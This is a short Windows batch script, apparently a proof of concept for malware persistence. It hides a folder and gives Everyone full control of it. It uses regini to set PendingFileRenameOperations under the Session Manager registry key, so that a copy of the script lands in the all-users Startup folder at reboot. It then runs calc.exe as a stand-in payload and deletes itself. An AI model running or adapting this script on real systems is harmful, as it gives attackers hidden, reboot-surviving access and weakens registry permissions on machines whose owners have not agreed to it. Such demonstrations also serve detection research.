rem USAGE: 1. create foo.cmd file containing all these lines, 2. run it as admin, 3. enjoy your calculator!
rem It changes permissions to the "Session Manager" registry key. Don't try on prod!

md c:\persistence
attrib.exe +h +s c:\persistence
icacls.exe C:\persistence /grant:r Everyone:F
echo "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager" [7] > c:\persistence\reg.txt
echo PendingFileRenameOperations = REG_MULTI_SZ "\??\c:\persistence\cmd.txt" "\??\c:\Users\All Users\Microsoft\Windows\Start Menu\Programs\StartUp\runme.cmd" >> c:\persistence\reg.txt
regini.exe c:\persistence\reg.txt
copy "%~f0" c:\persistence\cmd.txt /y
calc.exe
del "%~f0"
